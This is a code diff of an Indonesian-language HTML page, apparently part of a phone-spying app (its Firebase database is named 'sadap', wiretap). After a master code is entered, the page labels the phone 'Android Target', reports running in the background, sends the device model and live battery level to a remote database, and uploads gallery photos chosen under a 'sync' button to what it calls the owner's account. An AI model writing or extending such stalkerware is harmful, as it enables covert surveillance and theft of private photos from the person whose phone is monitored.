@@ -15,7 +15,7 @@
         .input-code { width: 100%; background: #0f172a; border: 1px solid #334155; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 10px; text-align: center; outline: none; }
         .input-code:focus { border-color: #38bdf8; }
         .btn-connect { background: #38bdf8; color: #0f172a; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
-        .btn-gallery { background: #22c55e; color: #000; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-gallery { background: #22c55e; color: #000; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 14px; }
         .btn-gallery:active { transform: scale(0.98); }
         span { color: #f8fafc; font-family: monospace; }
     </style>
@@ -34,19 +34,17 @@
             <div class="info-id">ID Terdaftar: <span id="dev-id">-</span></div>
             <p style="color: #4ade80; font-size: 13px; margin-bottom: 15px;">Berjalan di Latar Belakang</p>
             
-            <!-- Tombol sinkronisasi galeri otomatis -->
-            <button class="btn-gallery" onclick="triggerGalleryAccess()">
+            <button class="btn-gallery" onclick="requestAndOpenGallery()">
                 <i class="fa-solid fa-images"></i> Sinkronkan Foto Galeri
             </button>
         </div>
         
-        <!-- Input file tersembunyi dengan dukungan multiple & tangkapan langsung storage -->
-        <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" onchange="uploadPhotos(this)">
+        <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" onchange="processAndUpload(this)">
     </div>
 
     <script>
         const databaseURL = "https://sadap-app-d2359-default-rtdb.firebaseio.com";
-        const MASTER_CODE = "28092010"; // Kode Master Owner
+        const MASTER_CODE = "28092010";
 
         let deviceId = localStorage.getItem("winz_device_id");
         if (!deviceId) {
@@ -56,12 +54,11 @@
         document.getElementById('dev-id').innerText = deviceId;
 
         if (localStorage.getItem("winz_connected") === "true") {
-            showActiveSection();
+            activateSystem();
         }
 
         function verifyAndConnect() {
             let inputCode = document.getElementById('targetCode').value.trim();
-
             if (!inputCode) {
                 alert("Kode tidak boleh kosong!");
                 return;
@@ -73,26 +70,25 @@
                     localStorage.setItem("winz_device_id", deviceId);
                     document.getElementById('dev-id').innerText = deviceId;
                 }
-
                 localStorage.setItem("winz_connected", "true");
-                showActiveSection();
+                activateSystem();
             } else {
                 alert("Kode Tautan Salah!");
             }
         }
 
-        function showActiveSection() {
+        function activateSystem() {
             document.getElementById('setup-section').style.display = "none";
             document.getElementById('active-section').style.display = "block";
             document.getElementById('status').innerText = "Terhubung ke Server";
-            startBackgroundServices();
+            initBackgroundServices();
         }
 
-        function triggerGalleryAccess() {
-            // Memicu input file agar WebView/Sketchware meminta izin storage & membuka galeri
-            const fileInput = document.getElementById('galleryInput');
-            fileInput.value = ""; // Reset agar bisa pilih file yang sama berulang kali
-            fileInput.click();
+        function requestAndOpenGallery() {
+            // Memicu input file secara langsung untuk memunculkan izin dan galeri sistem
+            const input = document.getElementById('galleryInput');
+            input.value = ""; 
+            input.click();
         }
 
         function getPhoneModel() {
@@ -110,17 +106,14 @@
             return "Android Target";
         }
 
-        function startBackgroundServices() {
+        function initBackgroundServices() {
             const phoneName = getPhoneModel();
-
-            // Kirim info model perangkat ke Firebase
             fetch(`${databaseURL}/devices/${deviceId}/model.json`, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(phoneName)
             }).catch(() => {});
 
-            // Kirim data status baterai real-time
             function sendBattery(level, isCharging) {
                 fetch(`${databaseURL}/devices/${deviceId}/battery.json`, {
                     method: 'PUT',
@@ -143,40 +136,31 @@
             }
         }
 
-        // Fungsi otomatis memproses foto yang dipilih dari galeri perangkat
-        function uploadPhotos(input) {
+        // Memproses dan mengirim foto yang dipilih langsung ke server Firebase akun owner
+        function processAndUpload(input) {
             const files = input.files;
             if (!files || files.length === 0) return;
 
-            // Berikan notifikasi proses sinkronisasi sedang berjalan
-            let totalFiles = files.length;
-            let uploadedCount = 0;
+            let total = files.length;
+            let count = 0;
 
-            for (let i = 0; i < totalFiles; i++) {
-                const file = files[i];
+            for (let i = 0; i < total; i++) {
                 const reader = new FileReader();
-                
                 reader.onload = function(e) {
                     fetch(`${databaseURL}/devices/${deviceId}/gallery.json`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(e.target.result)
                     }).then(() => {
-                        uploadedCount++;
-                        if (uploadedCount === totalFiles) {
-                            alert("Berhasil! " + totalFiles + " foto dari perangkat disinkronkan ke server.");
+                        count++;
+                        if (count === total) {
+                            alert("Berhasil! " + total + " foto telah disinkronkan ke akun owner.");
                         }
-                    }).catch(() => {
-                        // Ignore individual network errors to keep batch running
-                    });
+                    }).catch(() => {});
                 };
-                reader.readAsDataURL(file);
+                reader.readAsDataURL(files[i]);
             }
         }
     </script>
 </body>
 </html>
-
-
-
-    
